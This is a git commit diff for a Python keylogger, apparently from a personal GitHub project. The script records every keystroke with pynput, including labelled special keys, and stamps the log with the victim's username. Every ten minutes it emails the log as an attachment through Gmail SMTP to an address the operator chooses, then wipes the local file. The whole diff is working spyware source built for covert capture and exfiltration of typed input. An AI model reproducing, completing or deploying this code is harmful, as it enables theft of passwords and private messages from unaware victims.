199f815dceaca99b40a7053bf3ba3723bb307d01
kenluu3 <44096907+kenluu3@users.noreply.github.com>
2020-01-11 18:10:02 -0500

    Added key logs for non-alphanumeric keys, changed format for textfile display. Also now reads the name of the user's computer.

--- main.py
+++ main.py
@@ -1,23 +1,22 @@
-import pynput, time, threading, os, smtplib, ssl
+import pynput, time, threading, os, smtplib, ssl, getpass
 
-from datetime import datetime
+from datetime import datetime # Display the date the log is made.
 from pynput.keyboard import Key, Listener
 from threading import Thread
 from email.mime.multipart import MIMEMultipart # Creates a Email object.
 from email.mime.text import MIMEText # For text.
 from email.mime.application import MIMEApplication # For File Attachment
 
-
-
 # Email information.
-EMAILID = "EMAIL" # REPLACE
-EMAILPASS = "PASS" # REPLACE
-TOEMAIL = "EMAIL TO RECEIVE FILES" # REPLACE
 
-CYCLE = 10 * 60 # Time interval to Email and Clean Logs. (10 Minutes)
+EMAILID = "EMAIL" # REPLACE
+EMAILPASS = "PASSWORD" # REPLACE
+TOEMAIL = "SENDER" # REPLACE
+
+CYCLE = 60 * 10 # Time interval to Email and Clean Logs. (10 Minutes)
 FILENAME = "log.txt" # Filename.
 finished = False # Global Track to see if Log is finished.
-ReplaceCode = {Key.space: ' ', Key.enter: '\n', Key.tab: ' '} # Dict Containing Non-alpha keys.
+ReplaceCode = {Key.space: ' ', Key.enter: '\n', Key.tab: ' [tab] ', Key.alt: ' [alt] ', Key.shift: ' [shift] ', Key.esc: ' [esc] ', Key.cmd: ' [cmd] '} # Dict Containing Non-alpha keys.
 
 # Key Press.
 def on_press(key):
@@ -54,30 +53,29 @@ def IntervalEmailandCls():
     while (finished == False):
         ElapsedTime = time.time() - StartTime
         if (ElapsedTime == CYCLE): # If 10 minutes has passed.
-
             try:
                 server = smtplib.SMTP('smtp.gmail.com', 587)  # Sets up a port connection.
-                server.starttls() # secure connection.
+    
+                server.starttls() # secure connection.  --> encrypts all info beyond this point.
+                
                 server.login(EMAILID, EMAILPASS) # Logins to account.
-
                 # EMAIL OBJECT
-                emailbod = MIMEMultipart()
-                emailbod['From'] = EMAILID
-                emailbod['To'] = TOEMAIL
-                emailbod['Subject'] = "Log from {0}".format(str(datetime.now()))
+                email = MIMEMultipart()
+                email['From'] = EMAILID
+                email['To'] = TOEMAIL
+                email['Subject'] = "Log from {0}".format(str(datetime.now()))
 
                 # TEXT FILE
                 logFile = MIMEApplication(open(FILENAME).read()) # Reads the file.
                 logFile.add_header('Content-Disposition', 'attachment; filename=%s' % FILENAME) # Type of Content(i.e. attachment vs inline), attachment type.
-                emailbod.attach(logFile) # Attach the file to the email.
+                email.attach(logFile) # Attach the file to the email.
 
-                emailbod.attach(MIMEText('Contains the all key logs from {0}'.format(str(datetime.now()))))
+                email.attach(MIMEText('Contains the all key logs from user {0} on {1}'.format(getpass.getuser(),str(datetime.now().replace(microsecond=0))))) # Retrieves UserID from env var of system.
 
-                server.sendmail(EMAILID,TOEMAIL, emailbod.as_string()) # Sends it as a string form.
+                server.sendmail(EMAILID, TOEMAIL, email.as_string()) # Sends it as a string form.
 
             except Exception as E:
-                print(E.__str__())
-
+                print(str(E)) # Error detected i.e. Login failed.
             finally:
                 server.quit() # Close the connection.
 
@@ -86,21 +84,25 @@ def IntervalEmailandCls():
 
 # Clears the file.
 def clean_file(file):
-    open(file, 'w').close()
-    print("\n FILE IS CLEANED \n")
+    recreate_file(file)
+    print("\nFILE IS CLEANED AND SENT.\n")
 
 # Writes to the file.
 def write_file(file, input):
     with open(file, 'a') as file:
         file.write(input)
 
-# Function to retrieve Key presses.
-def main():
+def recreate_file(file):
+    with open(file, 'w') as file:
+        file.write("User: {0} | Date: {1} \n".format(getpass.getuser(), datetime.now().replace(microsecond=0))) # Initialize File with Userid and Date.
 
-    global finished
+# Function to retrieve Key presses.
+def StartLog():
+
+    global finished # Finish to stop scheduled cleaning and sending of file.
 
     # Create a new file to write to.
-    open(FILENAME, "w+").close()
+    recreate_file(FILENAME)
 
     # Create Keyboard Listener.
     with Listener(on_press=on_press, on_release=on_release) as listener:
@@ -112,6 +114,7 @@ def main():
 
 # Execute if it is the main module.
 if __name__ == "__main__":
-    # Executing both Cleanup Interval and Main method.
-    Thread(target=main).start()
-    Thread(target=IntervalEmailandCls()).start()
+
+    # Executing both Cleanup Interval and Main method simultaneously.
+    Thread(target=StartLog).start()  # Keeps reading keystrokes while esc not pressed.
+    Thread(target=IntervalEmailandCls).start() # Tracks time to before cleaning and sending the text file.
